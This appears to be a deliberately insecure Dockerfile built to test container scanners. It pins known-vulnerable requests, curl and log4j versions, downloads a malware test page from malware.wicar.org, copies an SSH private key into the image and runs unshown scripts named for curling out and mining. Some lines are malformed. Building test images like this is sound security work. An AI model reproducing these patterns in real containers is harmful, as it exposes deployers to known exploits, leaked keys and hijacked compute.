#multi-stage built container
FROM python:3.7-alpine as TheSneaky

WORKDIR /app

RUN pip install requests==2.14.0


FROM ubuntu:14:04 as spooky
COPY --from=TheSneaky /root/.local /root/.local

RUN python3 -m venv /venv

ENV PATH=/venv/bin:$PATH

WORKDIR /veryMalicious
RUN apt update && apt install curl-7.44.0 wget unzip -y

RUN /bin/sh -c wget https://downloads.apache.org/logging/log4j/2.12.1/apache-log4j-2.12.1-bin.tar.gz && tar -xzvf apache-log4j-2.12.1-bin.tar.gz

RUN wget http://malware.wicar.org/data/vlc_amv.html

WORKDIR /verySensetive

COPY ssh_rsa_priv_key .

WORKDIR /veryDangerous

COPY ./scrpts ./

RUN /bin/bash ./i_curl_you.sh &

RUN /bin/bash ./i_mine_you.sh &

RUN /bin/bash
CMD ['/bin/bash', './i_drift_you.sh']

